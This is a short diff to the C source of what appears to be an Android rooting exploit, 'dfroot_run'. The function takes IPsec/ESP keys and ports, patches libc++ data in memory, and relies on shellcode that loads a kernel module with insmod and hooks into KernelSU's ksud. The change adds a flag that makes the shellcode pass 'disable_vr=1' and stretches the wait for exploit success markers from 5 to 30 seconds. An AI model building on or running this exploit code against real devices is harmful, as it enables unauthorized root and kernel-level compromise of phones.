@@ -723,7 +723,7 @@ int dfroot_run(int encap_port, int sender_port,
                const uint32_t spi[MAX_SAS], const int icv_len[MAX_SAS], int nsa,
                const uint8_t aes_key[32], const uint8_t hmac_key[32],
                const char *ko_target, const char *package_name, int soft_reboot,
-               int stage) {
+               int stage, int no_vr) {
     struct Reporter ro = {0}, *reporter = &ro;
 
     g_encap_port  = encap_port;
@@ -755,6 +755,10 @@ int dfroot_run(int encap_port, int sender_port,
     char *stageval = libcxx_data + libcxx_stage_val_off;
     if (stage > 0 && stage <= 3)
         snprintf(stageval, 12, "%d", stage);
+    /* the shellcode adds "disable_vr=1" to insmod only when a digit is set */
+    extern uint32_t libcxx_dvr_val_off;
+    if (no_vr)
+        *(libcxx_data + libcxx_dvr_val_off) = '1';
 
     struct PatchRestore libcxx_r = {0};
 
@@ -785,7 +789,10 @@ int dfroot_run(int encap_port, int sender_port,
     };
     int seen[sizeof(markers)/sizeof(markers[0])] = {0};
 
-    for (int elapsed = 0; elapsed < 5000; elapsed += 10) {
+    /* The LKM is loaded and the libc++ hook fires within the first seconds;
+     * ksud late-load and soft-reboot can take 10s+ on slow storage, so poll
+     * for up to 30s. Panic before a marker means the reboot was not ours. */
+    for (int elapsed = 0; elapsed < 30000; elapsed += 10) {
         usleep(10000);
         for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
             if (!seen[j] && has_marker(markers[j].path)) {
